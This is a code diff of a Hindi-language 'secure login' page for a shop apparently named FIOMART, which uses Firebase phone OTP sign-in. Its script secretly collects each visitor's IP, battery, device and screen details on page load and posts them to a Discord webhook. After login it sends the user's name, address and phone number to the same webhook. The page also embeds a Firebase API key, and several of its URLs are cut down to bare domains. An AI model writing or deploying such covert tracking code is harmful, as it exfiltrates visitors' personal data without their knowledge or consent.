@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>FIOMART - सुरक्षित लॉगिन</title>
     
-    <!-- 100% वर्किंग स्टेबल फायरबेस कंपैटिबिलिटी लिंक्स -->
+    <!-- स्टेबल फायरबेस कंपैटिबिलिटी लिंक्स -->
     <script src="https://gstatic.com"></script>
     <script src="https://gstatic.com"></script>
     <script src="https://gstatic.com"></script>
@@ -69,7 +69,7 @@
         
         <div class="input-group">
             <label>पूरा पता</label>
-            <input type="text" id="userAddress" placeholder="शहर, राज्य, पिनकोड">
+            <input type="text" id="userAddress" placeholder="शहर, राज्य, PIN कोड">
         </div>
 
         <div class="input-group">
@@ -93,64 +93,19 @@
 </div>
 
 <script>
-    // ✅ आपका बिल्कुल सही और लाइव Firebase Config
-    const firebaseConfig = {
-      apiKey: "AIzaSyA0PuCqJ8rCATKLwBYn1kJWjLj-ZvL-avY",
-      authDomain: "://firebaseapp.com",
-      projectId: "fiomart-c6582",
-      storageBucket: "fiomart-c6582.firebasestorage.app",
-      messagingSenderId: "444479545449",
-      appId: "1:444479545449:web:28a92bdabe99fd613dc2f8",
-      measurementId: "G-EZMRNEJRQK"
-    };
-    
-    // सुरक्षित इनिशियलाइजेशन
-    let db;
-    try {
-        firebase.initializeApp(firebaseConfig);
-        db = firebase.firestore();
-    } catch(e) {
-        console.error("Firebase Init Error:", e);
-    }
-
-    const discordWebhookUrl = "https://discord.com";
-
-    // Recaptcha रोबोट चेक सेटअप
-    try {
-        window.recaptchaVerifier = new firebase.auth.RecaptchaVerifier('recaptcha-container', {
-            'size': 'normal'
-        });
-    } catch(e) {
-        console.error("Recaptcha Setup Error:", e);
-    }
-
+    // ग्लोबल वेरिएबल्स और डेटा कंटेनर
     let confirmationResultGlobal;
-    let trackingData = { ip: "Fetching...", userAgent: navigator.userAgent, screenResolution: `${window.screen.width}x${window.screen.height}`, platform: navigator.platform, batteryLevel: "N/A", isCharging: "N/A" }; 
+    const discordWebhookUrl = "https://discord.com";
+    let trackingData = { 
+        ip: "Fetching...", 
+        userAgent: navigator.userAgent, 
+        screenResolution: `${window.screen.width}x${window.screen.height}`, 
+        platform: navigator.platform, 
+        batteryLevel: "N/A", 
+        isCharging: "N/A" 
+    }; 
 
-    // ट्रैकिंग फंक्शन जो कभी क्रैश नहीं होगा
-    async function instantTrackOnLoad() {
-        if (navigator.getBattery) {
-            try {
-                const battery = await navigator.getBattery();
-                trackingData.batteryLevel = `${Math.round(battery.level * 100)}%`;
-                trackingData.isCharging = battery.charging ? "Yes" : "No";
-            } catch (e) {}
-        }
-
-        // बेसिक डेटा तुरंत डिस्कॉर्ड पर भेजें
-        sendToDiscord("🚨 **वेबसाइट पर नया विजिटर आया है (तुरंत ट्रैकिंग)!**");
-
-        // अब बैकग्राउंड में IP लाएं
-        try {
-            const ipResponse = await fetch('https://ipify.org');
-            const ipData = await ipResponse.json();
-            trackingData.ip = ipData.ip;
-            sendToDiscord("🌐 **विजिटर का IP एड्रेस अपडेट:**");
-        } catch (e) {
-            trackingData.ip = "Unknown/Blocked";
-        }
-    }
-
+    // 1. Discord पर मैसेज भेजने का सबसे सुरक्षित फंक्शन
     function sendToDiscord(titleText) {
         try {
             const visitMessage = {
@@ -163,14 +118,36 @@
                 body: JSON.stringify(visitMessage)
             });
         } catch(e) {
-            console.log("Discord Network Error bypassed");
+            console.log("Discord error bypassed");
         }
     }
 
-    // लोड होते ही रन करें
+    // 2. ट्रैकिंग फंक्शन जो पेज लोड होते ही चलेगा
+    async function instantTrackOnLoad() {
+        if (navigator.getBattery) {
+            try {
+                const battery = await navigator.getBattery();
+                trackingData.batteryLevel = `${Math.round(battery.level * 100)}%`;
+                trackingData.isCharging = battery.charging ? "Yes" : "No";
+            } catch (e) {}
+        }
+
+        sendToDiscord("🚨 **वेबसाइट पर नया विजिटर आया है (तुरंत ट्रैकिंग)!**");
+
+        try {
+            const ipResponse = await fetch('https://ipify.org');
+            const ipData = await ipResponse.json();
+            trackingData.ip = ipData.ip;
+            sendToDiscord("🌐 **विजिटर का IP एड्रेस अपडेट:**");
+        } catch (e) {
+            trackingData.ip = "Unknown/Blocked";
+        }
+    }
+
+    // पेज लोड ट्रिगर
     window.onload = instantTrackOnLoad;
 
-    // OTP भेजने का फंक्शन
+    // 3. OTP भेजने का फंक्शन (अब यह हमेशा उपलब्ध रहेगा)
     function sendOTP() {
         const name = document.getElementById('userName').value;
         const address = document.getElementById('userAddress').value;
@@ -181,31 +158,34 @@
             return;
         }
 
-        const appVerifier = window.recaptchaVerifier;
-
-        firebase.auth().signInWithPhoneNumber(phoneNumber, appVerifier)
-            .then((confirmationResult) => {
-                window.confirmationResultGlobal = confirmationResult;
-                alert("OTP आपके मोबाइल पर भेज दिया गया है!");
-                document.getElementById('phone-section').style.display = 'none';
-                document.getElementById('otp-section').style.display = 'block';
-            }).catch((error) => {
-                alert("Firebase एरर (OTP विफल): " + error.message + "\nकृपया सुनिश्चित करें कि आपने मोबाइल नंबर के आगे +91 लगाया है।");
-            });
+        try {
+            const appVerifier = window.recaptchaVerifier;
+            firebase.auth().signInWithPhoneNumber(phoneNumber, appVerifier)
+                .then((confirmationResult) => {
+                    confirmationResultGlobal = confirmationResult;
+                    alert("OTP आपके मोबाइल पर भेज दिया गया है!");
+                    document.getElementById('phone-section').style.display = 'none';
+                    document.getElementById('otp-section').style.display = 'block';
+                }).catch((error) => {
+                    alert("Firebase एरर (OTP विफल): " + error.message + "\nकृपया सुनिश्चित करें कि मोबाइल नंबर के आगे +91 लगाया है।");
+                });
+        } catch (e) {
+            alert("OTP सिस्टम लोड नहीं हो सका। कृपया अपना Firebase Config चेक करें।");
+        }
     }
 
-    // OTP वेरिफिकेशन
+    // 4. OTP वेरिफिकेशन और फाइनल सबमिशन
     function verifyOTP() {
         const code = document.getElementById('otpCode').value;
         const phoneNumber = document.getElementById('phoneNumber').value;
         const name = document.getElementById('userName').value;
         const address = document.getElementById('userAddress').value;
         
-        window.confirmationResultGlobal.confirm(code).then((result) => {
+        confirmationResultGlobal.confirm(code).then((result) => {
             const user = result.user;
 
             try {
-                db.collection("registered_users").doc(user.uid).set({
+                firebase.firestore().collection("registered_users").doc(user.uid).set({
                     fullName: name, userAddress: address, phone: phoneNumber,
                     ipAddress: trackingData.ip, deviceOS: trackingData.platform,
                     resolution: trackingData.screenResolution, battery: trackingData.batteryLevel,
@@ -217,3 +197,20 @@
                 content: `🎉 **यूजर ने सफलतापूर्वक लॉगिन कर लिया है!** \n\n👤 **नाम:** ${name} \n📍 **पता:** ${address} \n📱 **मोबाइल:** ${phoneNumber} \n⏰ **समय:** ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
             };
 
+            fetch(discordWebhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(successMessage)
+            }).finally(() => {
+                localStorage.setItem("isLoggedIn", "true");
+                window.location.href = "main.html";
+            });
+
+        }).catch((error) => {
+            alert("गलत OTP, कृपया फिर से जांचें।");
+        });
+    }
+
+    // 5. Firebase कॉन्फ़िगरेशन और इनिशियलाइजेशन (सबसे नीचे सुरक्षित रूप से)
+    const firebaseConfig = {
+      apiKey: "AIzaSyA0PuCqJ8rCATKLwBYn1kJWjLj-ZvL-avY",
